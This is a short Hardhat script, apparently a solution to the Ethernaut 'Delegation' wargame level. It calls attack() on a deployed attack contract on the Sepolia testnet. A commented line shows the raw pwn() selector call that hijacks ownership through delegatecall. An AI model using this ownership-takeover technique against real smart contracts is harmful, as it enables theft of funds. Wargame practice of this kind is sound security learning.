const { ethers, upgrades } = require("hardhat");
const hre = require("hardhat");
// const ethers = require('ethers').ethers;
const dotenv = require('dotenv').config();
const dotenvExpand = require('dotenv-expand');

const AttackContractAbi = require('../../artifacts/contracts/006/DelegationAttack.sol/DelegationAttack.json');

// use interpolation for .env variables
dotenvExpand(dotenv);

// const RPC_NODE = 'http://localhost:8545';
const RPC_NODE = process.env.SEPOLIA;
const ATTACK_CONTRACT_ADDRESS = '0x67080bA7aBcecb708fF4c0D6e8E7b53980233e85';
const WALLET_ADDRESS = '0x482E046e2C76c1d0C3b082574C6a05a4B1D5D7C9';
const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000';
let ACCOUNTS;

const getAccounts = async () => {
  return ACCOUNTS = await ethers.getSigners();
};

const main = async () => {
  await getAccounts();
  if (!RPC_NODE) { console.log('skipping blockchain check'); return true; }

  const provider = new ethers.providers.JsonRpcProvider(RPC_NODE);
  const contract = new ethers.Contract(ethers.utils.getAddress(ATTACK_CONTRACT_ADDRESS), AttackContractAbi.abi, provider);
  
  // call attack contract
  await contract.connect(ACCOUNTS[0]).attack();
  console.log('Action performed on contract:', contract.address);

  // var pwnFunc = web3.utils.keccak256("pwn()")
  // await contract.sendTransaction({ data: pwnFunc });
};


main();
